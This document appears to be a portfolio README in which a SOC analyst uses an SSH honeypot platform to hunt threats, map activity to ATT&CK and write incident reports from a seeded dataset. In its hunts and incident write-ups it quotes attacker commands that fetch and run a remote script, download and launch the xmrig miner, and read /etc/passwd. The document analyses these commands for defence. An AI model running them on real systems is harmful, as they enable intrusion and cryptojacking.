# SOC Analyst Showcase

A walkthrough of how I use **SentinelSSH** to perform real SOC work — threat
hunting, investigation, ATT&CK analysis, and reporting — using only the platform's
existing data and API. Examples below are drawn from the live demo dataset
(deterministic seed) so they're reproducible.

> Skills demonstrated: **log analysis · threat detection · incident response ·
> security monitoring · threat intelligence.**

---

## 1. Threat Hunting Examples

Each hunt is a question answered against the API/dashboard.

**Hunt 1 — "Who is pulling payloads onto the box?" (ingress tool transfer)**
```bash
curl "$BASE/api/behaviors" | jq               # confirm tool_transfer is observed
curl "$BASE/api/high-risk?min_score=80" | jq  # pull the high-risk sessions
curl "$BASE/api/attacks/<id>" | jq '.data.commands, .data.mitre'  # confirm in detail
```
*Finding:* sessions from `185.220.100.5` (Russia) run
`wget http://45.95.147.20/x.sh; chmod +x x.sh; ./x.sh` — a stager fetched from a
second hostile IP, mapped to **T1105** + **T1059**.

**Hunt 2 — "Any cryptomining on the estate?" (impact)**
```bash
curl "$BASE/api/mitre?hours=24" | jq '.[] | select(.id=="T1496")'
curl "$BASE/api/high-risk?min_score=85" | jq
```
*Finding:* a high-risk session runs `./xmrig --donate-level 1` against a pool —
**T1496 Resource Hijacking**, risk ≈ 91.

**Hunt 3 — "Are attackers persisting?" (cron / keys)**
```bash
curl "$BASE/api/behaviors" | jq                          # is cron_persistence present?
curl "$BASE/api/commands?limit=50" | jq '.data[] | select(.command|test("cron"))'
```
*Finding:* `crontab -e` activity → **T1053.003**, indicating an attempt to survive
reboot. Prioritised for containment.

**Hunt 4 — "Repeat offenders by volume"**
```bash
curl "$BASE/api/top-countries?hours=24" | jq
curl "$BASE/api/incidents?sort=attempt_count&order=desc" | jq '.data[0]'
```
*Finding:* a single source IP accounts for the largest share of attempts —
candidate for an immediate blocklist entry.

---

## 2. Incident Investigation Workflow

Repeatable triage process used for every incident card:

1. **Detect** — high-risk alert appears live on the dashboard (`new_attack` +
   `incident_update` over WebSocket).
2. **Scope** — open the incident: `GET /api/incidents/<id>` → severity, attempt
   count, first/last seen, aggregated behaviours, related sessions.
3. **Analyse logs** — drill into a session: `GET /api/attacks/<id>` → ordered
   command timeline, credentials used, SSH client version, duration.
4. **Enrich** — review GeoIP (country/ASN/ISP) and reputation to attribute and
   prioritise the source.
5. **Classify** — confirm MITRE techniques per the kill chain (access → discovery
   → C2 → impact).
6. **Decide** — recommend containment (block IP/ASN, alert on the credential pair)
   and set status `open → triaged → closed`.
7. **Report** — export the incident report (PDF/CSV/JSON) for stakeholders.

---

## 3. MITRE ATT&CK Analysis Examples

Mapping observed activity to the kill chain (techniques are resolved by the
platform; see `core/intel/mitre.py`):

| Stage | Observed activity | Technique |
|-------|-------------------|-----------|
| Credential Access | repeated `root`/`admin` guesses | **T1110 / T1110.001** Brute Force |
| Defense Evasion | login with a default credential pair | **T1078** Valid Accounts |
| Lateral Movement | interactive SSH shell after "auth" | **T1021.004** Remote Services: SSH |
| Discovery | `uname -a`, `whoami`, `id`, `cat /etc/passwd` | **T1082 / T1033 / T1087** |
| Command & Control | `wget`/`curl` of a remote script | **T1105** Ingress Tool Transfer |
| Execution | `chmod +x x.sh; ./x.sh` | **T1059** Command & Scripting Interpreter |
| Persistence | `crontab -e` | **T1053.003** Scheduled Task: Cron |
| Impact | `./xmrig` to a mining pool | **T1496** Resource Hijacking |

*Coverage view:* `GET /api/mitre` ranks the most-observed techniques — **T1110**
and **T1021.004** dominate, confirming the estate's primary exposure is
internet-wide SSH brute forcing followed by hands-on-keyboard activity.

---

## 4. Credential Attack Trends

```bash
curl "$BASE/api/top-usernames?limit=8" | jq
curl "$BASE/api/top-passwords?limit=8" | jq
```

*Findings from the dataset:*
- **Top usernames:** `root`, `admin`, `ubuntu`, `postgres`, `oracle`, `git`, `pi`
  — attackers target default service/admin accounts, not real users.
- **Top passwords:** `123456`, `password`, `admin`, `root`, `toor`, `qwerty`
  — classic default/dictionary lists.
- **Takeaway:** disabling password auth and root login (key-only) neutralises the
  overwhelming majority of attempts. Any *successful* use of these pairs in
  production would be an immediate **T1078** alert.

---

## 5. Attack Source Analysis

```bash
curl "$BASE/api/top-countries?limit=10" | jq
curl "$BASE/api/attacks?is_malicious=true&sort=risk_score&order=desc" | jq
```

*Findings:*
- **Geography:** sources span Russia, Netherlands, China, Brazil, Bulgaria,
  South Africa — consistent with global automated scanning, not targeted activity.
- **Infrastructure:** hostile traffic clusters on bulletproof/abuse-tolerant
  hosting ASNs (e.g. *FlokiNET*, *IP Volume inc*, *M247*) — useful for ASN-level
  blocking.
- **Reputation:** sessions flagged `is_malicious` (reputation 100) correlate
  directly with the highest risk scores and the most aggressive behaviour
  (tool transfer, mining) — validating the enrichment as a triage signal.

---

## 6. Sample Incident Writeups

**INC — High: SSH foothold → payload delivery → persistence (`185.220.100.5`, RU)**
- **Summary:** Brute-force access followed by hands-on-keyboard activity.
- **Timeline:** `uname -a` → `wget http://45.95.147.20/x.sh` → `chmod +x x.sh` →
  `./x.sh` → `crontab -e`.
- **ATT&CK:** T1078, T1110, T1105, T1059, T1053.003, T1021.004.
- **Risk:** ~96 (High). Reputation: malicious. ASN: FlokiNET.
- **Assessment:** automated loader establishing cron persistence and staging a
  second-stage payload from a paired hostile IP.
- **Recommendation:** block `185.220.100.5` and the payload host `45.95.147.20`;
  block the source ASN; alert on `crontab` writes; key-only SSH. → status `triaged`.

**INC — High: Cryptomining (`xmrig`)**
- **Summary:** Post-access deployment of a Monero miner.
- **Timeline:** `curl -O http://pool/xmrig` → `./xmrig --donate-level 1`.
- **ATT&CK:** T1078, T1110, T1496, T1021.004. **Risk:** ~91 (High).
- **Assessment:** resource hijacking for profit; high host-CPU impact expected.
- **Recommendation:** isolate host, block pool egress, hunt for the same binary
  hash elsewhere. → status `triaged`.

**INC — Medium: Reconnaissance only**
- **Summary:** Access followed by discovery, no payload.
- **Timeline:** `whoami` → `id` → `uname -a` → `cat /etc/passwd`.
- **ATT&CK:** T1082, T1033, T1087, T1021.004. **Risk:** ~78.
- **Assessment:** manual/automated enumeration; likely triage before a later
  return. Monitor the source for escalation. → status `open`.

---

## 7. Security Findings Summary

- **Primary threat:** continuous, automated SSH brute forcing (**T1110**) from
  globally distributed, abuse-tolerant hosting — the dominant technique observed.
- **Escalation pattern:** a meaningful subset progresses past access to
  discovery, payload delivery (**T1105/T1059**), persistence (**T1053.003**), and
  impact (**T1496** cryptomining) — i.e. real hands-on-keyboard risk, not just noise.
- **Credential exposure:** attacks rely almost entirely on default/dictionary
  credentials against service/admin accounts — fully mitigated by key-only auth
  and disabled root login.
- **Highest-value detections:** correlation of *malicious reputation + tool
  transfer + persistence* reliably surfaces the most dangerous sessions first.
- **Recommended controls:** key-only SSH, root login disabled, fail2ban on the
  real admin port, IP/ASN blocklisting of repeat offenders, and egress filtering
  to break C2/payload retrieval.

---

*All examples use SentinelSSH's existing API and seeded dataset — no additional
tooling required. Set `BASE=http://localhost:8008` to reproduce locally.*
